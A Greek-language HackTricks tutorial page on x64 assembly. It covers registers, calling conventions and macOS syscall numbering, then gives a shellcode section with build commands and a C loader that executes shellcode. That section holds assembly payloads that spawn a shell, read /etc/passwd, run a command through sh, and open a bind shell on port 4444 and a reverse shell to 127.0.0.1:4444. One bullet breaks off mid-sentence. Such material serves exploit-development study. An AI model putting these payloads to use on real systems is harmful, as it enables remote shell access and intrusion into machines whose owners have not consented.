# Εισαγωγή στο x64

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## **Εισαγωγή στο x64**

Το x64, επίσης γνωστό ως x86-64, είναι μια αρχιτεκτονική επεξεργαστή 64-bit που χρησιμοποιείται κυρίως στους υπολογιστές επιφάνειας εργασίας και σε εξυπηρετητές. Προέρχεται από την αρχιτεκτονική x86 που παρήγαγε η Intel και υιοθετήθηκε αργότερα από την AMD με το όνομα AMD64, είναι η κυρίαρχη αρχιτεκτονική στους προσωπικούς υπολογιστές και σε εξυπηρετητές σήμερα.

### **Καταχωρητές**

Το x64 επεκτείνει την αρχιτεκτονική x86, προσφέροντας **16 καταχωρητές γενικής χρήσης** με ετικέτες `rax`, `rbx`, `rcx`, `rdx`, `rbp`, `rsp`, `rsi`, `rdi` και `r8` έως `r15`. Κάθε ένας από αυτούς μπορεί να αποθηκεύσει μια τιμή **64-bit** (8-byte). Αυτοί οι καταχωρητές έχουν επίσης υπο-καταχωρητές 32-bit, 16-bit και 8-bit για συμβατότητα και συγκεκριμένες εργασίες.

1. **`rax`** - Χρησιμοποιείται παραδοσιακά για τις **τιμές επιστροφής** από συναρτήσεις.
2. **`rbx`** - Συχνά χρησιμοποιείται ως **καταχωρητής βάσης** για λειτουργίες μνήμης.
3. **`rcx`** - Χρησιμοποιείται συνήθως για **μετρητές βρόχων**.
4. **`rdx`** - Χρησιμοποιείται σε διάφορους ρόλους συμπεριλαμβανομένων των επεκτεινόμενων αριθμητικών λειτουργιών.
5. **`rbp`** - **Δείκτης βάσης** για το πλαίσιο στοίβας.
6. **`rsp`** - **Δείκτης στοίβας**, παρακολουθεί την κορυφή της στοίβας.
7. **`rsi`** και **`rdi`** - Χρησιμοποιούνται για τους **δείκτες πηγής** και **προορισμού** σε λειτουργίες συμβολοσειράς/μνήμης.
8. **`r8`** έως **`r15`** - Επιπλέον καταχωρητές γενικής χρήσης που εισήχθησαν στο x64.

### **Σύμβαση Κλήσης**

Η σύμβαση κλήσης x64 διαφέρει μεταξύ λειτουργικών συστημάτων. Για παράδειγμα:

* **Windows**: Οι πρώτες **τέσσερις παράμετροι** περνιούνται στους καταχωρητές **`rcx`**, **`rdx`**, **`r8`** και **`r9`**. Επιπλέον παράμετροι προστίθενται στη στοίβα. Η τιμή επιστροφής βρίσκεται στον **`rax`**.
* **System V (συνηθισμένα χρησιμοποιούμενο σε συστήματα UNIX-like)**: Οι πρώτες **έξι ακέραιες ή δείκτες παράμετροι** περνιούνται στους καταχωρητές **`rdi`**, **`rsi`**, **`rdx`**, **`rcx`**, **`r8`** και **`r9`**. Η τιμή επιστροφής βρίσκεται επίσης στον **`rax`**.

Αν η συνάρτηση έχει περισσότερες από έξι εισόδους, οι **υπόλοιπες περνιούνται στη στοίβα**. Το **RSP**, ο δείκτης στοίβας, πρέπει να είναι **16 bytes ευθυγραμμισμένος**, που σημαίνει ότι η διεύθυνση στην οποία δείχνει πρέπει να είναι διαιρέσιμη με το 16 πριν συμβεί οποιαδήποτε κλήση. Αυτό σημαίνει ότι συνήθως θα πρέπει να διασφαλίσουμε ότι το RSP είναι σωστά ευθυγραμμισμένο στο shellcode μας πριν κάνουμε μια κλήση συνάρτησης. Ωστόσο, στην πράξη, οι κλήσεις συστήματος λειτουργούν πολλές φορές ακόμα κι αν αυτή η απαίτηση δεν πληροίται.

### Σύμβαση Κλήσης στο Swift

Το Swift έχει τη δική του **σύμβαση κλήσης** που μπορεί να βρεθεί στο [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64)

### **Κοινές Οδηγίες**

Οι οδηγίες x64 διαθέτουν ένα πλούσιο σύνολο, διατηρώντας τη συμβατότητα με προηγούμενες οδηγίες x86 και εισάγοντας νέες.

* **`mov`**: **Μετακίνηση** μιας τιμής από έναν **καταχωρητή** ή **τοποθεσία μνήμης** σε άλλον.
* Παράδειγμα: `mov rax, rbx` — Μετακινεί την τιμή από το `rbx` στο `rax`.
* **`push`** και **`pop`**: Προσθέτει ή αφαιρεί τιμές από/στη **στοίβα**.
* Παράδειγμα: `push rax` — Προσθέτει την τιμή στο `rax` στη στοίβα.
* Παράδειγμα: `pop rax` — Αφαιρεί την κορυφαία τιμή από τη στοίβα στο `rax`.
* **`add`** και **`sub`**: Λειτουργίες **πρόσθεσης** και **αφαίρεσης**.
* Παράδειγμα: `add rax, rcx` — Προσθέτει τις τιμές στο `rax` και `rcx` αποθηκεύοντας το αποτέλεσμα στο `rax`.
* **`mul`** και **`div`**: Λειτουργίες **πολλαπλασιασμού** και **διαίρεσης**. Σημείωση: αυτές έχουν συγκεκριμένες συμπεριφορές όσον αφορά τη χρήση των τελεστών.
* **`call`** και **`ret`**: Χρησιμοποιούνται για την **κλήση** και την **επιστροφή από συναρτήσεις**.
* **`int`**: Χρησιμοποιείται για την ενεργοποίηση ενός λογισμικού **διακοπής**. Π.χ., το `int 0x80` χρησιμοποιήθηκε για κλήσεις συστήματος στο 32-bit x86 Linux.
* **`cmp`**: **Σύγκριση** δύο τιμών και ρύθμιση των σημαιών της CPU βάσει του αποτελέσματος.
* Παράδειγμα: `cmp rax, rdx` — Συγκρίνει το `rax` με το `rdx`.
* **`je`, `jne`, `jl`, `jge`, ...**: **Οδηγίες συνθήκης άλματος** που αλλάζουν τη ροή ελέγχου βάσει των αποτελεσμάτων μιας προηγούμενης `cmp` ή δοκιμής.
* Παράδειγμα: Μετά από μια οδηγία `cmp rax, rdx`, `je label` — Αλλάζει στην ετικέτα `label` αν το `rax` είναι ίσο με το `rdx`.
* **`syscall`**: Χρησιμοποιείται για **
## macOS

### συσκευές συστήματος

Υπάρχουν διαφορετικές κατηγορίες συσκευών συστήματος, μπορείτε να [**τις βρείτε εδώ**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall\_sw.h)**:**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
Στη συνέχεια, μπορείτε να βρείτε τον αριθμό κάθε συστοιχίας [**σε αυτήν τη διεύθυνση URL**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**:**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
Έτσι, για να καλέσετε το `open` syscall (**5**) από την κλάση **Unix/BSD** πρέπει να προσθέσετε: `0x2000000`

Έτσι, ο αριθμός syscall για να καλέσετε το open θα είναι `0x2000005`

### Shellcodes

Για να μεταγλωττίσετε:

{% code overflow="wrap" %}
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
{% endcode %}

Για να εξάγετε τα bytes:

{% code overflow="wrap" %}
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
{% endcode %}

<details>

<summary>Κώδικας C για να δοκιμάσετε το shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Προέρχεται από [**εδώ**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) και εξηγείται.

{% tabs %}
{% tab title="με adr" %}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}

{% tab title="με στοίβα" %}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{% endtab %}
{% endtabs %}

#### Διάβασμα με την εντολή cat

Ο στόχος είναι να εκτελεστεί η εντολή `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, οπότε το δεύτερο όρισμα (x1) είναι ένας πίνακας παραμέτρων (ο οποίος στη μνήμη αντιστοιχεί σε ένα σωρό διευθύνσεων).
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### Εκτέλεση εντολής με sh
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

Δέστε το shell από [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) στη **θύρα 4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Αντίστροφη κέλυφωση

Αντίστροφη κέλυφωση από [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html). Αντίστροφη κέλυφωση προς **127.0.0.1:4444**
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
